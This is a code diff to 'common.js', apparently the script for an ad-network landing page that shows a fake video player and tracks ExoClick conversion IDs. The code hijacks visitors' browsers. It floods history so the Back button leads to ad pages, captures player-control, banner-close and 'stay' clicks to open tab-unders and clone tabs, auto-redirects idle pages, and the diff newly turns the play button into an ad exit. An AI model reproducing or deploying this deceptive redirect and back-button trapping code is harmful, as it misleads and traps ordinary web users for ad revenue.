@@ -1,4 +1,10 @@
-/* common.js — FINAL v11 (Hybrid: Video + Fake Image Support) — UPDATED: external_id propagated to ALL exits + tabUnderClick_url tracking injection */
+/* common.js — FINAL v11 (Hybrid) — UPDATED:
+   - external_id propagated to ALL exits (AFU/back/reverse/autoexit/ageExit/etc.)
+   - tabUnderClick_url supports tracking injection (external_id + optional params)
+   - main_play behavior changed:
+       * ORIGINAL: main_play -> MICRO HANDOFF (open clone + tabUnderClick redirect)
+       * CLONE:    main_play -> MAIN EXIT (dual)
+*/
 
 (() => {
   "use strict";
@@ -13,15 +19,11 @@
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
-  // --- Прямое открытие (Без черного экрана и about:blank) ---
+  // --- Direct open (no about:blank) ---
   const openTab = (url) => {
     try {
-      // Сразу передаем URL. Адресная строка заполнится мгновенно.
       const w = window.open(url, "_blank");
-
-      // Сбрасываем opener для безопасности
       if (w) { try { w.opener = null; } catch {} }
-
       return w || null;
     } catch {
       return null;
@@ -33,6 +35,7 @@
   // ---------------------------
   const curUrl = new URL(window.location.href);
   const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
+
   const CLONE_PARAM = "__cl";
   const isClone = getSP(CLONE_PARAM) === "1";
 
@@ -44,11 +47,10 @@
     use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
     cid: getSP("cid"), geo: getSP("geo"),
 
-    // IMPORTANT: carry ExoClick conversions_tracking across BOTH campaigns and ALL exits
-    // Put it into landing URL as: external_id={conversions_tracking}
+    // ExoClick conversions_tracking passthrough
     external_id: getSP("external_id"),
 
-    // Optional passthrough (if you pass them / need them)
+    // Optional passthroughs
     creative_id: getSP("creative_id"),
     ad_campaign_id: getSP("ad_campaign_id"),
     cost: getSP("cost"),
@@ -107,8 +109,10 @@
         ex[tab][field] = v;
         return;
       }
+
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) { ensure(m[1])[m[2]] = v; return; }
+
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -118,6 +122,7 @@
         ex[tab][field] = v;
       }
     });
+
     return cfg;
   };
 
@@ -127,18 +132,33 @@
   const buildExitQSFast = ({ zoneId }) => {
     const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
     const base = {
-      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
-      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
-      os_version: osVersionCached || "", btz: getTimezoneName(), bto: String(getTimezoneOffset()),
-      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
-      ae: IN.ae || "", ab2r,
+      ymid: IN.var_1 || IN.var || "",
+      var: IN.var_2 || IN.z || "",
+      var_3: IN.var_3 || "",
 
-      // UPDATED: carry tracking params through ALL exits (AFU/back/reverse/etc.)
+      b: IN.b || "",
+      campaignid: IN.campaignid || "",
+      click_id: IN.s || "",
+      rhd: IN.rhd || "1",
+
+      os_version: osVersionCached || "",
+      btz: getTimezoneName(),
+      bto: String(getTimezoneOffset()),
+
+      cmeta: buildCmeta(),
+      pz: IN.pz || "",
+      tb: IN.tb || "",
+      tb_reverse: IN.tb_reverse || "",
+      ae: IN.ae || "",
+      ab2r,
+
+      // tracking passthrough
       external_id: IN.external_id || "",
       creative_id: IN.creative_id || "",
       ad_campaign_id: IN.ad_campaign_id || "",
       cost: IN.cost || "",
     };
+
     if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
     return qsFromObj(base);
   };
@@ -153,8 +173,8 @@
   };
 
   // ---------------------------
-  // DIRECT URL builder (for tabUnderClick_url / any ex.url)
-  // Ensures external_id reaches the next page/campaign too.
+  // Direct URL builder (for tabUnderClick_url / any ex.url)
+  // Inject external_id + optional params.
   // ---------------------------
   const buildDirectUrlWithTracking = (baseUrl) => {
     try {
@@ -165,7 +185,7 @@
       const creative_id = IN.creative_id || "";
       const cost = IN.cost || IN.b || "";
 
-      // Optional: cost/currency for target (Keitaro or PP)
+      // optional
       if (cost) u.searchParams.set("cost", cost);
       if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");
 
@@ -173,7 +193,7 @@
       if (creative_id) u.searchParams.set("creative_id", creative_id);
       if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);
 
-      // Keep original landing params too (optional)
+      // keep originals if missing
       if (IN.var_1 && !u.searchParams.has("var_1")) u.searchParams.set("var_1", IN.var_1);
       if (IN.var_2 && !u.searchParams.has("var_2")) u.searchParams.set("var_2", IN.var_2);
       if (IN.var_3 && !u.searchParams.has("var_3")) u.searchParams.set("var_3", IN.var_3);
@@ -191,7 +211,7 @@
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) { window.history.pushState(null, "Please wait...", url); }
+      for (let i = 0; i < n; i++) window.history.pushState(null, "Please wait...", url);
       window.history.pushState(null, document.title, originalUrl);
     } catch (e) { err("Back pushState error:", e); }
   };
@@ -210,16 +230,21 @@
     const count = cfg.back?.count ?? 10;
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
+
     const qs = buildExitQSFast({ zoneId: b.zoneId });
+
     if (b.url) qs.set("url", String(b.url));
-    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
+    else {
+      qs.set("z", String(b.zoneId));
+      qs.set("domain", String(b.domain || cfg.domain || ""));
+    }
+
     page.search = qs.toString();
     pushBackStates(page.toString(), count);
   };
 
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
-    // UPDATED: any direct URL (tabUnderClick_url, mainExit_url, etc.) gets tracking injected
     if (ex.url) return buildDirectUrlWithTracking(ex.url);
     if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
     return "";
@@ -230,7 +255,9 @@
     if (!ex) return;
     const url = resolveUrlFast(ex, cfg);
     if (!url) return;
+
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
+
     if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
     else { replaceTo(url); }
   };
@@ -238,8 +265,10 @@
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
+
     const ct = ex.currentTab;
     const nt = ex.newTab;
+
     const ctUrl = resolveUrlFast(ct, cfg);
     const ntUrl = resolveUrlFast(nt, cfg);
 
@@ -250,12 +279,13 @@
 
     if (withBack) initBackFast(cfg);
     if (ntUrl) openTab(ntUrl);
-    if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
+    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
   };
 
   const run = (cfg, name) => {
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
+      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true)
+                                  : runExitCurrentTabFast(cfg, "mainExit", true);
     }
     if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
     return runExitCurrentTabFast(cfg, name, true);
@@ -274,9 +304,18 @@
     if (!cfg?.autoexit?.currentTab) return;
     const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
     let armed = false;
-    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
+
+    const trigger = () => {
+      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
+    };
+
     const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
-    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
+
+    const cancel = () => {
+      clearTimeout(timer);
+      document.removeEventListener("visibilitychange", trigger);
+    };
+
     document.addEventListener("visibilitychange", trigger);
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
   };
@@ -287,24 +326,24 @@
   };
 
   // ---------------------------
-  // Micro Handoff
+  // Micro Handoff (clone + tabUnderClick redirect)
   // ---------------------------
   const MICRO_DONE_KEY = "__micro_done";
+
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
     u.searchParams.set("__skipPreview", "1");
 
-    // --- UPDATED: Синхронизация (Видео ИЛИ Картинка) ---
+    // sync video OR fake image
     const video = document.querySelector("video");
-    const imgFrame = document.querySelector(".xh-frame"); // Поддержка фейк-плеера
+    const imgFrame = document.querySelector(".xh-frame");
 
     if (video) {
-      // Если есть реальное видео
       u.searchParams.set("t", video.currentTime || 0);
-      if (video.getAttribute("poster")) u.searchParams.set("__poster", video.getAttribute("poster"));
+      const poster = video.getAttribute("poster");
+      if (poster) u.searchParams.set("__poster", poster);
     } else if (imgFrame) {
-      // Если это фейк-плеер (картинка)
       u.searchParams.set("t", 0);
       if (imgFrame.src) u.searchParams.set("__poster", imgFrame.src);
     }
@@ -337,7 +376,9 @@
   // ---------------------------
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
-    const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);
+    const microTargets = new Set([
+      "timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"
+    ]);
 
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
@@ -345,14 +386,31 @@
       const modal = document.getElementById("xh_exit_modal");
       const banner = document.getElementById("xh_banner");
 
-      // 1. БАННЕР: КАРТИНКА -> ВЫХОД
+      // 0) PLAY FLOW (two-step):
+      // ORIGINAL: main_play -> micro handoff (clone + tabUnderClick redirect)
+      // CLONE:    main_play -> mainExit (dual)
+      if (t === "main_play") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+
+        if (isClone) {
+          if (fired.mainExit) return;
+          fired.mainExit = true;
+          run(cfg, "mainExit");
+          return;
+        }
+
+        runMicroHandoff(cfg);
+        return;
+      }
+
+      // 1) BANNER: IMAGE -> MAIN EXIT
       if (t === "banner_main") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         run(cfg, "mainExit");
         return;
       }
 
-      // 2. БАННЕР: КРЕСТИК/КНОПКА -> MICRO HANDOFF (Клон + Табандер)
+      // 2) BANNER: CLOSE -> MICRO HANDOFF (clone + tabUnder)
       if (t === "banner_close") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         if (banner) banner.style.display = "none";
@@ -360,7 +418,7 @@
         return;
       }
 
-      // 3. BACK UI BUTTON -> SHOW MODAL
+      // 3) BACK UI BUTTON -> SHOW MODAL
       if (t === "back_button") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         if (modal) {
@@ -370,7 +428,7 @@
         return;
       }
 
-      // 4. MODAL: "STAY" -> Micro Handoff
+      // 4) MODAL: STAY -> MICRO HANDOFF
       if (t === "modal_stay") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         if (modal) modal.style.display = "none";
@@ -378,14 +436,14 @@
         return;
       }
 
-      // 5. MODAL: "LEAVE" -> AgeExit (Dual)
+      // 5) MODAL: LEAVE -> AGE EXIT (dual)
       if (t === "modal_leave") {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         run(cfg, "ageExit");
         return;
       }
 
-      // 6. CLONE -> Main Exit
+      // 6) CLONE -> MAIN EXIT (any click)
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
@@ -394,14 +452,14 @@
         return;
       }
 
-      // 7. MICRO CONTROLS
+      // 7) MICRO CONTROLS -> MICRO HANDOFF
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         runMicroHandoff(cfg);
         return;
       }
 
-      // 8. MAIN EXIT (ALL OTHERS)
+      // 8) MAIN EXIT (all others)
       if (fired.mainExit) return;
       fired.mainExit = true;
       e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
@@ -409,19 +467,29 @@
     }, true);
   };
 
+  // ---------------------------
+  // Boot
+  // ---------------------------
   const boot = () => {
     if (typeof window.APP_CONFIG === "undefined") {
       document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
       return;
     }
+
     const cfg = normalizeConfig(window.APP_CONFIG);
     if (!cfg) return;
 
     window.LANDING_EXITS = {
-      cfg, run: (name) => run(cfg, name), initBack: () => initBackFast(cfg),
-      microHandoff: () => runMicroHandoff(cfg), isPlayerReady,
+      cfg,
+      run: (name) => run(cfg, name),
+      initBack: () => initBackFast(cfg),
+      microHandoff: () => runMicroHandoff(cfg),
+      isPlayerReady,
     };
-    initClickMap(cfg); initAutoexit(cfg); initReverse(cfg);
+
+    initClickMap(cfg);
+    initAutoexit(cfg);
+    initReverse(cfg);
   };
 
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
